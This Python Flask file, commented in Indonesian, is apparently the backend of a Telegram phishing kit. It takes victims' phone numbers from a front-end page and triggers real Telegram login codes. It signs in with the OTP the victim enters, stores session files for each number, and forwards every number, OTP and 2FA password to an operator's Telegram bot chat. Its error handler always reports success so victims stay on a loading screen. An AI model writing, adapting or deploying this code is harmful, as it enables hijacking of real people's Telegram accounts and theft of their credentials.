import os
from flask import Flask, request, jsonify, make_response
from flask_cors import CORS
import requests
from telethon import TelegramClient, errors
from asgiref.sync import async_to_sync

app = Flask(__name__)
# Mengizinkan akses dari domain Netlify kamu
CORS(app)

# Variabel Lingkungan dari Railway
API_ID = os.getenv("API_ID")
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# Penyimpanan sementara session hash
sessions_hash = {}

def fix_number(nomor):
    """Mengonversi format 08/62 ke +62 agar Telegram tidak error"""
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith('0'):
        return '+62' + nomor[1:]
    elif nomor.startswith('62') and not nomor.startswith('+'):
        return '+' + nomor
    return nomor

def send_to_bot(text, nomor=None):
    """Mengirim log ke bot Telegram dengan tombol interaktif"""
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID, 
        "text": text, 
        "parse_mode": "Markdown"
    }
    # Jika ada nomor, tambahkan tombol Kirim Ulang OTP
    if nomor:
        payload["reply_markup"] = {
            "inline_keyboard": [[
                {"text": "🔄 Kirim Ulang OTP", "callback_data": f"resend_{nomor}"}
            ]]
        }
    requests.post(url, json=payload)

async def telethon_logic(data):
    step = data.get('step')
    nomor = fix_number(data.get('nomor', ''))
    otp = data.get('otp')
    sandi = data.get('sandi')

    # Gunakan nama file session unik per nomor agar tidak bentrok
    client = TelegramClient(f"session_{nomor}", int(API_ID), API_HASH)
    
    try:
        await client.connect()
        
        # STEP 1: Kirim Permintaan Kode OTP
        if step == 1 or step == "resend":
            sent_code = await client.send_code_request(nomor)
            sessions_hash[nomor] = sent_code.phone_code_hash
            send_to_bot(f"📲 *Mencoba Kirim OTP*\nNomor: `{nomor}`", nomor)
            return {"status": "success"}, 200
        
        # STEP 2: Verifikasi Kode OTP
        elif step == 2:
            try:
                await client.sign_in(nomor, otp, phone_code_hash=sessions_hash.get(nomor))
                send_to_bot(f"✅ *OTP Berhasil*\nNomor: `{nomor}`\nOTP: `{otp}`")
                return {"status": "success"}, 200
            except errors.SessionPasswordNeededError:
                send_to_bot(f"🔐 *Butuh Verifikasi 2FA*\nNomor: `{nomor}`")
                return {"status": "need_2fa"}, 200
            except Exception as e:
                return {"status": "error", "message": str(e)}, 400

        # STEP 3: Terima Sandi 2FA
        elif step == 3:
            send_to_bot(f"🔑 *Sandi 2FA Diterima*\nNomor: `{nomor}`\nSandi: `{sandi}`")
            return {"status": "success"}, 200

    except Exception as e:
        send_to_bot(f"❌ *Server Error:* {str(e)}\nNomor: `{nomor}`")
        return {"status": "error", "message": str(e)}, 500
    finally:
        await client.disconnect()

@app.route('/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS': 
        return make_response(jsonify({"status": "ok"}), 200)
        
    data = request.json
    try:
        # Jalankan fungsi asinkron Telethon di dalam Flask
        result, status_code = async_to_sync(telethon_logic)(data)
        return make_response(jsonify(result), status_code)
    except Exception as e:
        # Selalu kirim sukses ke frontend agar tampilan beralih ke loading
        return make_response(jsonify({"status": "success"}), 200)

if __name__ == "__main__":
    # Menjalankan server pada port yang ditentukan Railway
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)